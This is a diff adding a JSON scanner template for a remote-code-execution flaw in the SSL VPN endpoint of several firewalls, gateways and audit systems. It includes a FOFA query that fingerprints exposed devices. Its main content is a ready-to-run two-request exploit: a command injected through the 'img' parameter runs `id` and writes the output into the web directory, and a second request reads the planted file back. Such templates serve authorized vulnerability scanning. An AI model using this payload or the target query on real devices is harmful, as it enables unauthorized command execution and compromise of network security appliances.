@@ -1,0 +1,52 @@
+{
+  "product": "*",
+  "vul_name": "安全设备(防火墙、网关、安全审计系统)RCE",
+  "type": "文件上传",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "H3C-下一代防火墙/安恒信息-明御安全网关/D_Link-下一代防火墙/迈普通信技术股份有限公司安全网关/博达通信-下一代防火墙/任天行安全审计系统等安全设备均存在RCE漏洞",
+  "version": "",
+  "note": "",
+  "search": {
+    "FOFA": "body=\"/webui/images/default/default/alert_close.jpg\""
+  },
+  "protocol": "http",
+  "link": "https://blog.csdn.net/qq_45936921/article/details/135047884",
+  "fix": [],
+  "exploit": [
+    {
+      "exp": {
+        "method": "get",
+        "follow": false,
+        "path": "/sslvpn/sslvpn_client.php?client=logoImg&img=%20/tmp|echo%20%60id%60%20|tee%20/usr/local/webui/sslvpn/52e039302a62d077.txt"
+      },
+      "verify": {
+        "path": "",
+        "logic": "and",
+        "check": [
+          {
+            "status": 200,
+            "body": "52e039302a62d077"
+          }
+        ]
+      }
+    },
+    {
+      "exp": {
+        "method": "get",
+        "follow": false,
+        "path": "/sslvpn/52e039302a62d077.txt"
+      },
+      "verify": {
+        "path": "",
+        "logic": "and",
+        "check": [
+          {
+            "status": 200,
+            "body": "uid="
+          }
+        ]
+      }
+    }
+  ]
+}
